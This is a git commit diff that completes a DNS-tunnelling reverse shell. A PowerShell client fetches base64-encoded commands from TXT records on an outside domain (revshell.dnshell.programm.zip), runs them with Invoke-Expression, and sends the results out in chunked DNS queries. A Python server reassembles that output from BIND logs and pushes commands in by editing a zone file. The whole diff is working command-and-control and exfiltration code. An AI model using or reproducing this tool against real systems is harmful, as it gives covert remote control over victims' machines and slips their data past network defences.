4f9b57ad40c99ce6ac35bb683d11f8b6007e1a2a
Nicicalu <caluori.nici@gmail.com>
2023-06-16 23:37:23 +0200

    Working :-)

--- revshell/client.ps1
+++ revshell/client.ps1
@@ -1,41 +1,60 @@
+function Send-Data {
+    param (
+        $data,
+        $code,
+        $counter
+    )
+    
+    # Encode data as Base64
+    $encodedData = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($data))
+    
+    # Replace padding characters with _ so it can be transmitted over DNS
+    $encodedData = $encodedData.Replace("=", "_")
+    
+    $chunks = [Math]::Ceiling($encodedData.Length / 63) # Calculate the number of chunks
+    
+    for ($i = 0; $i -lt $chunks; $i++) {
+        Write-Host "Sending Chunk $($i+1) of $chunks"
+        $currentChunk = $encodedData.Substring($i * 63, [Math]::Min(63, $encodedData.Length - $i * 63))
+        $query = "$i.$chunks.$code-$counter.$domain"
+        $dnsQuery = "$currentChunk.$query"
+    
+        # Send DNS query
+        $dnsResult = Resolve-DnsName -Name $dnsQuery -Server ns.programm.zip
+    
+        if ($dnsResult) {
+            # Never has a response ready, hopefully :-)
+        }
+    }
+}
+
 $domain = "revshell.dnshell.programm.zip"
-$code = "123"
+$code = (Get-Date).ToString("yyyyMMddHHmmss")
+
+# Send code to DNS server
+Send-Data -data $code -code 0 -counter 0
 
 # Request TXT record from DNS server
 $commandcount = 0
 $stop = $false
-while(!$stop){
+while (!$stop) {
     Write-Host "Request to: $commandcount.$code.$domain"
-    $dnsResult = Resolve-DnsName -Name "$commandcount.$code.$domain" -Server ns.programm.zip -Type TXT -DnsOnly
+    $dnsResult = Resolve-DnsName -Name "$commandcount.$code.$domain" -Server ns.programm.zip -Type TXT -DnsOnly -ErrorAction Ignore
     if ($dnsResult) {
-        $decodedResponse = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($response.Substring(0, $response.Length - 9)))
-        Write-Output $decodedResponse
+        try{
+            $command = $dnsResult.Strings
+            $command = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($command))
+            $output = $command | Invoke-Expression
+            $output = ($output | Format-Table | Out-String)
+            Send-Data -data $output -code $code -counter $commandcount
+        }
+        catch {
+            Send-Data -data "Error: $_" -code $code -counter $commandcount
+        }
         $commandcount++
     }
-    else{
+    else {
         
     }
     Start-Sleep -Seconds 2
-}
-
-exit;
-# Encode data as Base64
-$encodedData = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($data))
-
-# Replace padding characters with _ so it can be transmitted over DNS
-$encodedData = $encodedData.Replace("=", "_")
-
-$chunks = [Math]::Ceiling($encodedData.Length / 63) # Calculate the number of chunks
-
-for ($i = 0; $i -lt $chunks; $i++) {
-    $currentChunk = $encodedData.Substring($i * 63, [Math]::Min(63, $encodedData.Length - $i * 63))
-    $query = "$i.$chunks.$code.$domain"
-    $dnsQuery = "$currentChunk.$query"
-
-    # Send DNS query
-    $dnsResult = Resolve-DnsName -Name $dnsQuery -Server ns.programm.zip
-
-    if ($dnsResult) {
-        # Never has a response ready, hopefully :-)
-    }
 }
--- revshell/server.py
+++ revshell/server.py
@@ -3,24 +3,37 @@ import re
 import sys
 import base64
 
+
 def base64_decode_string(encoded_string):
     decoded_bytes = base64.b64decode(encoded_string)
     decoded_string = decoded_bytes.decode('utf-8')
     return decoded_string
 
+
+def base64_encode_string(string):
+    encoded_bytes = base64.b64encode(string.encode("utf-8"))
+    encoded_string = encoded_bytes.decode("utf-8")
+    return encoded_string
+
+
 logfile = "../bind/log/query.log"
+
+with open(logfile, "w") as file:
+    file.truncate()
 
 # Define a regular expression pattern to match the log line
 pattern = r"queries: client @\S+ (\d+\.\d+\.\d+\.\d+)#\d+ \((\S+)\): query: (\S+) (\S+) (\S+) \S+\ \((\d+\.\d+\.\d+\.\d+)\)"
 
 # Start tailing the log file
-p = subprocess.Popen(['tail', '-F', logfile], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+p = subprocess.Popen(['tail', '-F', logfile],
+                     stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 
 data = {}
 
 domain = "dnshell.programm.zip"
 
-def getData():
+
+def getData(code, counter, returndata=False):
     waitingfordata = True
     # Loop through the output of tail
     while waitingfordata:
@@ -39,50 +52,67 @@ def getData():
                     "domain_name": matches[1],
                     "query_class": matches[3],
                     "query_type": matches[4],
-                    "domain_parts": matches[1].replace(".dnshell.programm.zip", "").split(".")
-                }           
-                if query["query_type"] == "A":
+                    "domain_parts": matches[1].replace(f".revshell.{domain}", "").split(".")
+                }
+                if query["query_type"] == "A" and query["domain_name"].endswith(f"{code}-{counter}.revshell.{domain}"):
                     thisdata = query["domain_parts"]
-                    
-                    print(f"New query arrived from {query['ip_address']} for {query['domain_name']}, type: {query['query_type']}, class: {query['query_class']}")
-                    print(f"--- Recieved packet {thisdata[1]} of {thisdata[2]}")
-                    
+
+                    #print(f"New query arrived from {query['ip_address']} for {query['domain_name']}, type: {query['query_type']}, class: {query['query_class']}")
+                    #print(f"--- Recieved packet {thisdata[1]} of {thisdata[2]}")
+
                     if not thisdata[3] in data:
                         data[thisdata[3]] = {}
-                    data[thisdata[3]][int(thisdata[1])] = thisdata[0].replace("_", "=")
-                    # if dictionairy data[thisdata[3]] has thisdata[2] amount of keys
+                    data[thisdata[3]][int(thisdata[1])
+                                      ] = thisdata[0].replace("_", "=")
+
                     if len(data[thisdata[3]]) == int(thisdata[2]):
-                        print("--------------------- Data recieved ---------------------")
+                        #print("--------------------- Data recieved ---------------------")
                         # Put the data together in one variable
                         datastring = ""
                         for i in range(0, int(thisdata[2])):
                             datastring += data[thisdata[3]][i]
-                        print(f"Base64: {datastring}")
+                        #print(f"Base64: {datastring}")
                         # decode base64
                         decoded = base64_decode_string(datastring)
-                        print(f"Decoded: {decoded}")
+                        print(decoded)
+                        if(returndata):
+                            return decoded
                         waitingfordata = False
-                        
-                    else:
-                        print(f"--- Still missing {int(thisdata[2]) - len(data[thisdata[3]])} packets")
-                        
-            else:
-                print(f"No match {line_str}")
-                
-# Get input from user
-print("Enter code:")
-code = input()
+
+                    #else:
+                        #print(f"--- Still missing {int(thisdata[2]) - len(data[thisdata[3]])} packets")
+
+                # else:
+                    #print(f"--- Ignoring query from {query['ip_address']} for {query['domain_name']}, type: {query['query_type']}, class: {query['query_class']}")
+            # else:
+                #print(f"No match {line_str}")
+
+
+# Get Code from Client
+print("Waiting for client to connect... and identify itself")
+code = getData(0, 0, True)
 
 filename = f"../bind/data/zones/revshell.{domain}.zone"
+preset = f"../bind/data/zones/revshell.{domain}.preset"
 
 command = ""
 counter = 0
 while(command != "exit"):
     print("Enter command:")
-    command = input()
-    
+    command = base64_encode_string(input())
+
     # send command to client
     zone = open(filename, "a")
     zone.write(f"""{counter}.{code}       IN      TXT      {command}\n""")
     zone.close()
+
+    # update zones on bind
+    reloadrnc = 'docker-compose -f "../docker-compose.yml" exec bind9 rndc reload'
+    subprocess.run(reloadrnc, shell=True,
+                   stdout=subprocess.DEVNULL,
+                   stderr=subprocess.STDOUT)
+
+    # Wait for response
+    getData(code, counter)
+
     counter += 1
